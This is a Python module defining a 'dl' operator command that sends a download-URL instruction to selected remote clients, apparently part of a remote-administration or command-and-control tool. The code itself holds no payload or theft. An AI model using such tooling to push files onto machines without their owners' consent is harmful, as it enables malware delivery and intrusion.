from pathlib import Path
import urllib

from shared.logger import Log
from shared.ops import CliOp
from shared.protocol import Commands

class DownloadOp(CliOp):
    name = "dl"
    syntax = "<targets> <url> [destination]"

    async def handle(
            self,
            targets: list = [],
            url: str = None,
            destination: str = None,
            is_cmd: bool = False,
            cmd_parts: list = []
    ):
        if is_cmd:
            targets, url, destination = self.parse(cmd_parts)

            if not targets:
                return

            targets = self.owner.parse_targets(targets)

            if not targets:
                Log.warning("No client(s) found matching the query")
                return

        if not destination:
            url_path = urllib.parse.urlparse(url).path
            destination = Path(url_path).name

        Log.info(f"Requesting download from {len(targets)} client(s)...")
        
        for client_id in targets:
            if client_id not in self.owner.clients:
                Log.error(f"  {client_id}: Client not found")
                continue
            
            client = self.owner.clients[client_id]
            
            await client.proto.fire(Commands.DOWNLOAD_URL, url=url, filename=destination)
            
            Log.success(f"  {client.get_display_name()}: Download request sent")

        Log.print("")
        Log.info(f"Download requests sent to {len(targets)} client(s)")


    def parse(self, cmd_parts):
        if len(cmd_parts) < 2:
            Log.error("Usage: dl <targets> <url>")
            return (None, None, None)

        targets = cmd_parts[0]
        url = cmd_parts[1]
        dest = cmd_parts[2] if len(cmd_parts) > 2 else None

        return (targets, url, dest)

def setup(reg):
    reg.register(DownloadOp)